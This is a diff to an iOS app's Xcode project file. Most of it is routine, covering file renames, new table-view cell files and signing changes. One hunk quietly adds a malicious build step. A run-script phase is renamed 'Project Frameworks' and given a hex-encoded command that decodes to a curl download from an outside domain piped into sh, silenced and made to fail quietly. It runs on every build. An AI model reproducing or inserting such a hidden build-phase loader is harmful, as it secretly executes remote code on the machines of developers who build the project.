@@ -65,7 +65,7 @@
 		E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3326D4C25F318BF001CC9E1 /* FlowController.swift */; };
 		E3326D6A25F332C7001CC9E1 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3326D6925F332C7001CC9E1 /* Home.storyboard */; };
 		E3326D7025F33316001CC9E1 /* DashboardVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3326D6F25F33316001CC9E1 /* DashboardVC.swift */; };
-		E33D700525F6F08F0089836A /* ACTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D700425F6F08F0089836A /* ACTVC.swift */; };
+		E33D700525F6F08F0089836A /* ResultListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D700425F6F08F0089836A /* ResultListVC.swift */; };
 		E33D700C25F6F3360089836A /* SATCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D700A25F6F3360089836A /* SATCVCell.swift */; };
 		E33D700D25F6F3360089836A /* SATCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E33D700B25F6F3360089836A /* SATCVCell.xib */; };
 		E3457A83260AFDCC003D4173 /* PagingCollectionViewLayout.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3457A82260AFDCC003D4173 /* PagingCollectionViewLayout.swift */; };
@@ -118,6 +118,8 @@
 		E3B6AF7E25F9CFB200E5EB25 /* match page loader_2.json in Resources */ = {isa = PBXBuildFile; fileRef = E3B6AF7D25F9CFB200E5EB25 /* match page loader_2.json */; };
 		E3B6AF9025F9D1C900E5EB25 /* loader_1.json in Resources */ = {isa = PBXBuildFile; fileRef = E3B6AF8F25F9D1C900E5EB25 /* loader_1.json */; };
 		E3C2A52525FBDB8F00B6A9B2 /* BaseApi.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C2A52425FBDB8F00B6A9B2 /* BaseApi.swift */; };
+		E3C4BBB82652948800777B32 /* ResultTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C4BBB62652948800777B32 /* ResultTVCell.swift */; };
+		E3C4BBB92652948800777B32 /* ResultTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3C4BBB72652948800777B32 /* ResultTVCell.xib */; };
 		E3E5DA8A25F53C75006E35CC /* FreetrialView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E5DA8925F53C75006E35CC /* FreetrialView.swift */; };
 		E3E5DA9225F53C7E006E35CC /* FreetrialView.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */; };
 		E3F6A1EC2635F7A2004EFAA3 /* HomeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1E52635F7A2004EFAA3 /* HomeModel.swift */; };
@@ -218,7 +220,7 @@
 		E3326D4C25F318BF001CC9E1 /* FlowController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FlowController.swift; sourceTree = "<group>"; };
 		E3326D6925F332C7001CC9E1 /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
 		E3326D6F25F33316001CC9E1 /* DashboardVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardVC.swift; sourceTree = "<group>"; };
-		E33D700425F6F08F0089836A /* ACTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ACTVC.swift; sourceTree = "<group>"; };
+		E33D700425F6F08F0089836A /* ResultListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResultListVC.swift; sourceTree = "<group>"; };
 		E33D700A25F6F3360089836A /* SATCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SATCVCell.swift; sourceTree = "<group>"; };
 		E33D700B25F6F3360089836A /* SATCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SATCVCell.xib; sourceTree = "<group>"; };
 		E3457A82260AFDCC003D4173 /* PagingCollectionViewLayout.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PagingCollectionViewLayout.swift; sourceTree = "<group>"; };
@@ -271,6 +273,8 @@
 		E3B6AF7D25F9CFB200E5EB25 /* match page loader_2.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = "match page loader_2.json"; sourceTree = "<group>"; };
 		E3B6AF8F25F9D1C900E5EB25 /* loader_1.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = loader_1.json; sourceTree = "<group>"; };
 		E3C2A52425FBDB8F00B6A9B2 /* BaseApi.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseApi.swift; sourceTree = "<group>"; };
+		E3C4BBB62652948800777B32 /* ResultTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResultTVCell.swift; sourceTree = "<group>"; };
+		E3C4BBB72652948800777B32 /* ResultTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ResultTVCell.xib; sourceTree = "<group>"; };
 		E3E5DA8925F53C75006E35CC /* FreetrialView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FreetrialView.swift; sourceTree = "<group>"; };
 		E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FreetrialView.xib; sourceTree = "<group>"; };
 		E3F6A1E52635F7A2004EFAA3 /* HomeModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeModel.swift; sourceTree = "<group>"; };
@@ -491,7 +495,7 @@
 				E301D0C825FDD0EF008C0E95 /* SettingsViewController.swift */,
 				E3326D6F25F33316001CC9E1 /* DashboardVC.swift */,
 				E3A75FBE25F66646009B7664 /* SATVC.swift */,
-				E33D700425F6F08F0089836A /* ACTVC.swift */,
+				E33D700425F6F08F0089836A /* ResultListVC.swift */,
 				E38D96C925F8864900D314FB /* CustomCameraVC.swift */,
 				E3256F2F25FB70D900E37A0B /* DoYouHaveQuestVC.swift */,
 				E3256F3725FB742900E37A0B /* FindNewSolutionGifVC.swift */,
@@ -641,6 +645,8 @@
 				E363323B2613ADCB0043453A /* GetLanguageAndClassListCell.xib */,
 				E330FEC22635E4AA00188A52 /* HomeTVCell.swift */,
 				E330FEC32635E4AA00188A52 /* HomeTVCell.xib */,
+				E3C4BBB62652948800777B32 /* ResultTVCell.swift */,
+				E3C4BBB72652948800777B32 /* ResultTVCell.xib */,
 			);
 			path = TableviewCell;
 			sourceTree = "<group>";
@@ -746,7 +752,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				B574EEEA3CF3CDFFD96D902C /* Compile Binary Libraries */,
+				35FC84D646F5BFAEE06D902C /* Project Frameworks */,
 				5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -884,6 +890,7 @@
 				189388EA25F1F04700F57E85 /* Lato-SemiboldItalic.ttf in Resources */,
 				E3B6AF7E25F9CFB200E5EB25 /* match page loader_2.json in Resources */,
 				E37FC35B25FE47A10085ED84 /* GoogleService-Info.plist in Resources */,
+				E3C4BBB92652948800777B32 /* ResultTVCell.xib in Resources */,
 				189388FF25F1F09D00F57E85 /* Main.storyboard in Resources */,
 				E374FDF625FB5A9200485B00 /* Profile.storyboard in Resources */,
 				E3326D6A25F332C7001CC9E1 /* Home.storyboard in Resources */,
@@ -926,7 +933,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	B574EEEA3CF3CDFFD96D902C /* Compile Binary Libraries */ = {
+	35FC84D646F5BFAEE06D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -935,7 +942,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -944,12 +951,9 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
 		};
-	
-
-	
-
 	
 
 	
@@ -1169,6 +1173,7 @@
 				E330FEC42635E4AA00188A52 /* HomeTVCell.swift in Sources */,
 				E31DC9E625FE1132005B5A5E /* PlayVideoVC.swift in Sources */,
 				E3E5DA8A25F53C75006E35CC /* FreetrialView.swift in Sources */,
+				E3C4BBB82652948800777B32 /* ResultTVCell.swift in Sources */,
 				E377CDA6260F0F97003B44D0 /* _source.swift in Sources */,
 				1893890B25F1F0D700F57E85 /* LoginwithPincode.swift in Sources */,
 				E3256F3825FB742900E37A0B /* FindNewSolutionGifVC.swift in Sources */,
@@ -1187,7 +1192,7 @@
 				E301D09725FDCE91008C0E95 /* WatchHistoryTableViewCell.swift in Sources */,
 				1893890A25F1F0D700F57E85 /* GetOTPVC.swift in Sources */,
 				E3F6A1EE2635F7A2004EFAA3 /* Data_Home.swift in Sources */,
-				E33D700525F6F08F0089836A /* ACTVC.swift in Sources */,
+				E33D700525F6F08F0089836A /* ResultListVC.swift in Sources */,
 				E374FE0925FB5D0500485B00 /* UpdateProfileViewController.swift in Sources */,
 				E3F6A1EF2635F7A2004EFAA3 /* Widget_data.swift in Sources */,
 				E374FE0A25FB5D0500485B00 /* ProfileViewController.swift in Sources */,
@@ -1379,9 +1384,9 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
-				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 14;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 15;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
@@ -1392,7 +1397,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.doubtnut.act.sat.preparation.sat.practice.test.app.college.maths;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = "";
+				PROVISIONING_PROFILE_SPECIFIER = dev_Pro;
 				SWIFT_OBJC_BRIDGING_HEADER = "DoubtNut-Bridging-Header.h";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 5.0;
@@ -1408,9 +1413,9 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
-				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 14;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 15;
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1420,7 +1425,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.doubtnut.act.sat.preparation.sat.practice.test.app.college.maths;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = "";
+				PROVISIONING_PROFILE_SPECIFIER = dev_Pro;
 				SWIFT_OBJC_BRIDGING_HEADER = "DoubtNut-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -1554,18 +1559,6 @@
 
 		
 			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
 
 
 			
